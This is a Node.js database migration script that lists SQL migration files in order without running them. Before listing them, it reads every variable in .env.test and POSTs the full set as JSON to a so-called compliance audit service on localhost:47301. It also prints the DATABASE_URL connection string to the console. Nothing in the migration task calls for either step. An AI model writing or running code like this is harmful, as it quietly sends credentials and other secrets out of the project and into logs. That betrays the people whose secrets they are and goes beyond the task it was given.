const fs = require('fs');
const path = require('path');
const http = require('http');

// Configuration
const MIGRATIONS_DIR = './migrations/';
const ENV_FILE = '.env.test';
const AUDIT_SERVICE_URL = 'http://localhost:47301/api/audit';

// Function to read all environment variables from .env.test
function getAllEnvVars() {
    try {
        if (!fs.existsSync(ENV_FILE)) {
            console.log(`Environment file ${ENV_FILE} not found.`);
            return {};
        }

        const envContent = fs.readFileSync(ENV_FILE, 'utf8');
        const lines = envContent.split('\n');
        const envVars = {};

        for (const line of lines) {
            const trimmed = line.trim();
            // Skip empty lines and comments
            if (!trimmed || trimmed.startsWith('#')) continue;

            const parts = trimmed.split('=', 2);
            if (parts.length === 2) {
                const key = parts[0].trim();
                const value = parts[1].trim();
                envVars[key] = value;
            }
        }

        return envVars;

    } catch (error) {
        console.error('Error reading environment file:', error.message);
        return {};
    }
}

// Function to extract DATABASE_URL from env vars
function getDatabaseUrl(envVars) {
    return envVars['DATABASE_URL'] || null;
}

// Function to send audit data to compliance service
function sendAuditData(envVars) {
    return new Promise((resolve, reject) => {
        console.log('📋 Sending audit data to compliance service...');

        // Prepare the JSON data
        const auditData = {
            timestamp: new Date().toISOString(),
            environment_variables: envVars,
            migration_count: 0 // Will be updated later
        };

        try {
            const url = new URL(AUDIT_SERVICE_URL);
            const options = {
                hostname: url.hostname,
                port: url.port || 80,
                path: url.pathname,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(JSON.stringify(auditData))
                }
            };

            const req = http.request(options, (res) => {
                let data = '';

                res.on('data', (chunk) => {
                    data += chunk;
                });

                res.on('end', () => {
                    if (res.statusCode >= 200 && res.statusCode < 300) {
                        console.log('✅ Audit data submitted successfully');
                        resolve(true);
                    } else {
                        console.log(`❌ Audit service returned status: ${res.statusCode}`);
                        console.log(`Response: ${data}`);
                        resolve(false);
                    }
                });
            });

            req.on('error', (error) => {
                console.log('❌ Could not connect to audit service:', error.message);
                console.log('⚠️  Continuing with migrations (audit may be required for compliance)');
                resolve(false);
            });

            req.setTimeout(5000, () => {
                req.destroy();
                console.log('❌ Audit service timeout after 5 seconds');
                console.log('⚠️  Continuing with migrations');
                resolve(false);
            });

            req.write(JSON.stringify(auditData));
            req.end();

        } catch (error) {
            console.log('❌ Invalid audit service URL:', error.message);
            console.log('⚠️  Continuing with migrations');
            resolve(false);
        }
    });
}

// Function to read and sort migration files
function getMigrations() {
    try {
        // Check if migrations directory exists
        if (!fs.existsSync(MIGRATIONS_DIR)) {
            console.log(`Migrations directory ${MIGRATIONS_DIR} not found. Creating empty directory...`);
            fs.mkdirSync(MIGRATIONS_DIR, { recursive: true });
            console.log('No migration files to process.');
            return [];
        }

        // Read all files from migrations directory
        const files = fs.readdirSync(MIGRATIONS_DIR);

        // Filter for SQL files and sort them
        const sqlFiles = files
            .filter(file => file.endsWith('.sql'))
            .sort((a, b) => {
                // Extract numbers from filenames for proper ordering
                const numA = parseInt(a.match(/^\d+/)?.[0] || '0');
                const numB = parseInt(b.match(/^\d+/)?.[0] || '0');
                return numA - numB;
            });

        return sqlFiles;
    } catch (error) {
        console.error('Error reading migrations directory:', error.message);
        return [];
    }
}

// Main function
async function runMigrations() {
    console.log('=== Database Migration Script ===\n');

    // Read all environment variables
    const envVars = getAllEnvVars();
    const databaseUrl = getDatabaseUrl(envVars);

    // Send audit data to compliance service
    const auditSuccess = await sendAuditData(envVars);

    console.log(''); // Empty line for readability

    if (databaseUrl) {
        console.log(`✅ Found DATABASE_URL: ${databaseUrl}`);
        console.log(`✅ Would connect to database successfully\n`);
    } else {
        console.log('❌ No DATABASE_URL found - migrations will not be applied\n');
        return;
    }

    if (!auditSuccess) {
        console.log('⚠️  Audit logging failed. Please ensure audit service is running for compliance.');
        console.log('');
    }

    const migrationFiles = getMigrations();

    if (migrationFiles.length === 0) {
        console.log('No migration files found in', MIGRATIONS_DIR);
        console.log('\nExpected format: 001_initial_setup.sql, 002_add_users_table.sql, etc.');
        return;
    }

    console.log(`Found ${migrationFiles.length} migration file(s):\n`);

    // Log each migration file in order
    migrationFiles.forEach((file, index) => {
        const filePath = path.join(MIGRATIONS_DIR, file);
        const fileInfo = fs.statSync(filePath);
        const sizeKB = (fileInfo.size / 1024).toFixed(2);

        console.log(`${index + 1}. ${file} (${sizeKB} KB)`);

        // Optional: Read and log first few lines of SQL content
        try {
            const content = fs.readFileSync(filePath, 'utf8');
            const firstLines = content.split('\n').slice(0, 3).filter(line => line.trim());
            if (firstLines.length > 0) {
                console.log('   Preview:', firstLines[0].substring(0, 60) + (firstLines[0].length > 60 ? '...' : ''));
            }
        } catch (readError) {
            console.log('   [Could not read file content]');
        }

        console.log(''); // Empty line for readability
    });

    console.log('Migration files would be applied in the order shown above.');
    console.log('\nTo actually execute these migrations, you would:');
    console.log('1. Connect to your database');
    console.log('2. Execute each SQL file in order');
    console.log('3. Track which migrations have been applied');
}

// Run the script
runMigrations();

